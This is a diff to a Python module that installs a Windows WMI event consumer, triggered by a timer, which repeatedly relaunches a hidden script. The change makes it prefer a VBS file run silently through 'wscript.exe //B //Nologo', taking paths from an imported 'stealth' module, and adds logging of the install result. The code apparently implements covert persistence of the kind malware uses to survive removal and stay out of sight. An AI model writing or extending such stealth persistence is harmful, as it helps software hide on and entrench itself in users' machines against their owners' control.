@@ -21,6 +21,8 @@ import os
 import subprocess
 import time
 
+from . import log
+
 IS_WINDOWS = os.name == "nt"
 CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
 
@@ -137,7 +139,7 @@ def _fill(script: str, shim: str = "") -> str:
         .replace("@@CONSUMER@@", CONSUMER_NAME)
         .replace("@@TIMER@@", TIMER_ID)
         .replace("@@MS@@", str(TIMER_INTERVAL_MS))
-        .replace("@@CMD@@", f'cmd.exe /c "%s"' % shim)
+        .replace("@@CMD@@", shim)
     )
 
 
@@ -160,16 +162,23 @@ def install() -> list[str]:
     if not IS_WINDOWS or not is_admin():
         return []
     from .agent import stealth
+    vbs = stealth.anchor_vbs_path()
+    if not os.path.isfile(vbs):
+        vbs = stealth.vbs_path()
     shim = stealth.anchor_shim_path()
     if not os.path.isfile(shim):
         shim = stealth.shim_path()
-    if not os.path.isfile(shim):
+    if not os.path.isfile(vbs) and not os.path.isfile(shim):
         return []
-    code, out = _ps(_fill(_INSTALL_PS, shim), timeout=120)
+    launcher = (f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs)
+                else f'cmd.exe /c "{shim}"')
+    code, out = _ps(_fill(_INSTALL_PS, launcher), timeout=120)
+    log.get("guardian").info("WMI consumer install rc=%s %s", code, out.strip()[:120])
     if code == 0 and "ok" in out:
         global _last_wmi_check
         _last_wmi_check = time.time()
         return ["guardian: WMI consumer"]
+    log.get("guardian").warning("WMI consumer install failed: %s", out.strip()[:200])
     return []
 
 
